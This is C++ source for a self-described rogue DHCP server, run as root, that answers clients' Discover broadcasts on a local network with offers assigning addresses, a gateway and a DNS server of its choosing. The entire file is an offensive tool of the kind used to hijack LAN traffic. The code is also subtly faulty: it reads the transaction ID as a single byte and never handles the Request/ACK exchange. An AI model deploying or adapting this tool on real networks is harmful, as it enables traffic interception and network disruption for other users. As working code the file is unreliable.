// Compile: g++ -o dhcp_rogue dhcp_rogue.cpp
// Run: sudo ./dhcp_rogue
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <map>
#include <string>

class DHCPRogue {
private:
    int sock;
    std::map<std::string, std::string> leases;
    int nextIP;
    
public:
    DHCPRogue() : nextIP(100) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void start() {
        std::cout << "Rogue DHCP server started\n";
        
        while (true) {
            char packet[1024];
            struct sockaddr_in client;
            socklen_t clientLen = sizeof(client);
            
            int bytes = recvfrom(sock, packet, sizeof(packet), 0,
                                 (struct sockaddr*)&client, &clientLen);
            
            if (bytes < 240) continue;
            
            // Check for DHCP Discover
            if (packet[240] == 0x35 && packet[242] == 0x01) {
                std::string mac;
                char macStr[18];
                snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
                         (unsigned char)packet[28], (unsigned char)packet[29],
                         (unsigned char)packet[30], (unsigned char)packet[31],
                         (unsigned char)packet[32], (unsigned char)packet[33]);
                mac = macStr;
                
                std::string ip;
                if (leases.find(mac) == leases.end()) {
                    ip = "192.168.1." + std::to_string(nextIP++);
                    leases[mac] = ip;
                } else {
                    ip = leases[mac];
                }
                
                std::cout << "Offer " << ip << " to " << mac << std::endl;
                sendOffer(mac, ip, packet[4]);
            }
        }
    }
    
    void sendOffer(const std::string& mac, const std::string& ip, uint32_t xid) {
        char packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;  // Boot reply
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        
        *(uint32_t*)(packet + 4) = xid;
        
        // Your IP
        struct in_addr ipAddr;
        inet_aton(ip.c_str(), &ipAddr);
        *(uint32_t*)(packet + 16) = ipAddr.s_addr;
        
        // Server IP
        inet_aton("192.168.1.254", &ipAddr);
        *(uint32_t*)(packet + 20) = ipAddr.s_addr;
        
        // Client MAC
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &packet[28], &packet[29], &packet[30],
               &packet[31], &packet[32], &packet[33]);
        
        // Magic cookie
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        // DHCP Offer
        packet[pos++] = 0x35;
        packet[pos++] = 0x01;
        packet[pos++] = 0x02;
        
        // Subnet mask
        packet[pos++] = 0x01;
        packet[pos++] = 0x04;
        inet_aton("255.255.255.0", &ipAddr);
        memcpy(packet + pos, &ipAddr.s_addr, 4);
        pos += 4;
        
        // Router
        packet[pos++] = 0x03;
        packet[pos++] = 0x04;
        inet_aton("192.168.1.1", &ipAddr);
        memcpy(packet + pos, &ipAddr.s_addr, 4);
        pos += 4;
        
        // DNS
        packet[pos++] = 0x06;
        packet[pos++] = 0x04;
        inet_aton("8.8.8.8", &ipAddr);
        memcpy(packet + pos, &ipAddr.s_addr, 4);
        pos += 4;
        
        // End
        packet[pos++] = 0xFF;
        
        struct sockaddr_in broadcast;
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0, (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    ~DHCPRogue() { close(sock); }
};

int main() {
    DHCPRogue rogue;
    rogue.start();
    return 0;
}